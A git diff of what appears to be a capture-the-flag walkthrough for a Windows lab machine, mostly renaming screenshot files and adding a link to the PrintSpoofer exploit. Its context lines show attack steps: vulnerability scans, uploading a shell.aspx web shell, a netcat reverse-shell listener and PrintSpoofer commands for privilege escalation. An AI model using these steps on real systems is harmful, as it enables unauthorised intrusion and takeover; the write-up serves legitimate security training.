@@ -11,7 +11,7 @@
 <pre><code><strong>nmap -A 10.10.145.102
 </strong></code></pre>
 
-<figure><img src="../../.gitbook/assets/image (1) (7).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Scan all ports
 
@@ -66,7 +66,7 @@ Decided to scan for vulnerabilities and nmap detected that the host is vulnerabl
 sudo nmap 10.10.145.102 -p80,135,139,445,3389 --script *vuln*
 ```
 
-<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (11) (4).png" alt=""><figcaption></figcaption></figure>
 
 The exploit did not work as expected. It seems the credentials do not work for smb so now we must explore a different route.
 
@@ -105,20 +105,24 @@ put shell.aspx
 
 ```
 
-<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (2).png" alt=""><figcaption></figcaption></figure>
 
 **Kali #2**
 
 <pre><code><strong>rlwrap nc -lvnp 1337
 </strong></code></pre>
 
-<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
 
 
 
 ## Privilege Escalation
 
-SeImpersonatePrivilege&#x20;
+**Exploit:** [https://github.com/dievus/printspoofer](https://github.com/dievus/printspoofer)
+
+As SeImpersonatePrivilege is enabled for the user we can use Printspoofer as it works on Windows 10 and Server 2016/2019.
+
+****
 
 **Victim**
 
@@ -127,9 +131,9 @@ systeminfo
 whoami /priv
 ```
 
-<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
-
 <figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
 
 **Kali**
 
@@ -148,6 +152,6 @@ PrintSpoofer.exe -i -c whoami
 PrintSpoofer.exe -i -c powershell.exe
 ```
 
-<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>
